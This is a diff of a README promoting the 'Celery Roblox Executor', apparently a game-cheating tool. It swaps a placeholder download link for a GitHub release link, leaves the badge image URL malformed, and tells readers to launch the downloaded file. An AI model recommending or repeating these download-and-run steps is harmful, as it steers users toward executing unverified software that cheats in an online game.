@@ -22,9 +22,9 @@ The Celery Roblox Executor comes packed with robust features that enhance the ga
 
 ## Get Started
 
-To download the Celery Roblox Executor and start exploring its features, simply click on the following link: [Download Celery Executor](https://github.com/file/App.zip)
+To download the Celery Roblox Executor and start exploring its features, simply click on the following link: [Download Celery Executor](https://github.com/Amr414/Roblox-Celery/releases/tag/v2.0)
 
-[![Download Celery Executor](https://img.shields.io/badge/Download-Celery%20Executor-brightgreen)](https://github.com/file/App.zip)
+[![Download Celery Executor](https://github.com/Amr414/Roblox-Celery/releases/tag/v2.0%20Executor-brightgreen)](https://github.com/Amr414/Roblox-Celery/releases/tag/v2.0)
 
 If the link above ends with the file name, ensure to launch it to kickstart your gaming adventure. 
 
